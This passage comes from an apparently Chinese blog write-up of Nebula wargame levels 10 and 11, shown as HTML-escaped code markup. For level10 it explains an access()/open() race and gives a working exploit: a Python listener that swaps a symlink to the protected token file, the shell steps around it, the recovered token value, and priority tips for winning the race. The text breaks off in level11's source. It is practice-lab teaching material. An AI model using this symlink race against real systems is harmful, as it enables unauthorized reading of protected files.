    &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;access&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;R_OK&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;ffd&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;rc&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;sockaddr_in&lt;/span&gt; &lt;span class="n"&gt;sin&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Connecting to %s:18211 .. &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;fd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;memset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;sin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;sockaddr_in&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="n"&gt;sin&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sin_family&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;sin&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sin_addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;s_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;inet_addr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;sin&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sin_port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;htons&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;18211&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;sin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;sockaddr_in&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Unable to connect to host %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="cp"&gt;#define HITHERE &amp;quot;.oO Oo.\n&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;HITHERE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HITHERE&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Unable to write banner to host %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="cp"&gt;#undef HITHERE&lt;/span&gt;

    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Connected!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;Sending file .. &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;ffd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;O_RDONLY&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ffd&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Damn. Unable to open file&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="n"&gt;rc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ffd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rc&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Unable to read from file: %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;strerror&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;errno&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
      &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;rc&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;wrote file!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;You don&amp;#39;t have access to %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;看到这长长一段C代码……眼前出现“蛋疼”2字，不过题还是要做的，不打小怪兽，怎么当奥特曼？&lt;/p&gt;
&lt;p&gt;程序逻辑还是很简单，两个参数，第一个是文件路径，第二个是主机ip。程序通过access验证给定路径的文件是否有读取权限，如果有则对指定ip主机的18211端口发送一个HITHERE的字符串（话说上次给Github的大神写邮件人家也是那么打招呼的……），如果发送成功，就读取文件内容之后发送。&lt;/p&gt;
&lt;p&gt;flag10的home目录下有flag10程序和token文件，token对level10没有读取权限。看来又是要绕开权限去读取token的内容。但是应该如何做呢？在翻看了&lt;a href="http://linux.die.net/man/2/access"&gt;access()&lt;/a&gt;的man手册后发现那么一句话：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.&lt;/p&gt;
&lt;p&gt;access()验证权限是有风险的，因为在你验证文件和真正open文件的间隙，文件很可能会被利用！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个Warning绝对是个完美的Tip，顺顺思路：建立一个假的token文件（有权限读的），然后创建一个软连接指向这个文件。通过验证后利用短暂的间隙，把软连接指向真正的token，这样就狸猫换太子了~&lt;/p&gt;
&lt;p&gt;有了思路，如何实现呢？nc可以创建监听，但是没法在nc的途中快速修改软连接指向（毕竟nc是独占的，无法返回）。于是想到了python。&lt;code&gt;which python&lt;/code&gt;一下，果然装了python，再&lt;code&gt;python -V&lt;/code&gt;，发现python版本2.7.2。直接vim写下python代码（server.py）：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#! /usr/bin/python&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;

&lt;span class="n"&gt;HOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;PORT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;18211&lt;/span&gt;
&lt;span class="n"&gt;BUFSIZ&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4096&lt;/span&gt;
&lt;span class="n"&gt;ADDR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HOST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PORT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;tcpSerSock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;tcpSerSock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bind&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ADDR&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;tcpSerSock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;waiting for connection...&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;tcpCliSock&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tcpSerSock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;accept&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;connected!&amp;#39;&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tcpCliSock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BUFSIZ&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;break&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.oO Oo.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;get it baby!&amp;#39;&lt;/span&gt;
            &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ln -fs /home/flag10/token /home/level10/token&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;tcpCliSock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;tcpSerSock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;退出后使用&lt;code&gt;python server.py&lt;/code&gt;让脚本跑起来。这里需要注意的是，对于软连接使用了&lt;code&gt;-f&lt;/code&gt;参数，这样可以强制覆盖已经存在的同名软连接文件。之后&lt;code&gt;Ctrl+Alt+F2&lt;/code&gt;切换到TTY2，在level10家目录下执行：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;touch fake_token
ln -s fake_token token
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这样文件就伪造好了，然后执行flag10：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/home/flag10/flag10 ~/token &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;完毕后&lt;code&gt;Ctrl+Alt+F1&lt;/code&gt;切回TTY1看结果，&lt;code&gt;615a2ce1-b2b5-4c76-8eed-8aa5c4015c27&lt;/code&gt;，用这个作为密码登陆flag10并getflag即可。&lt;/p&gt;
&lt;p&gt;这里需要留意的是，因为CPU的执行方式是时间片，因此每个进程只有在自己的CPU时间内才能执行相应的指令，也正是因为这个原因，指令的执行之间才有了等待，并有了其他程序执行的可能性。很可能当CPU执行速度过快的时候，你的py程序还没来得及修改软连接，flag10就已经执行到最后了，因此无法读取到正确的token。这时你可以多试验几次，或者想办法降低flag10的优先级（&lt;code&gt;nice&lt;/code&gt;可以修改进程优先级），提高py脚本的优先级，以确保py脚本可以替换掉软连接。&lt;/p&gt;
&lt;h1&gt;Nebula level11&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;The /home/flag11/flag11 binary processes standard input and executes a shell command.&lt;/p&gt;
&lt;p&gt;There are two ways of completing this level, you may wish to do both :-)&lt;/p&gt;
&lt;p&gt;flag11会处理标准输入，同时执行一个shell命令。本关有两种方法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/mman.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="cm"&gt;/*&lt;/span&gt;
&lt;span class="cm"&gt; * Return a random, non predictable file, and return the file descriptor for it.&lt;/span&gt;
&lt;span class="cm"&gt; */&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;getrand&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;srandom&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

  &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getenv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;TEMP&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;pid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getpid&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

  &lt;span class="n"&gt;asprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;%s/%d.%c%c%c%c%c%c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
    &lt;span class="sc"&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; 
    &lt;span class="sc"&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="sc"&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

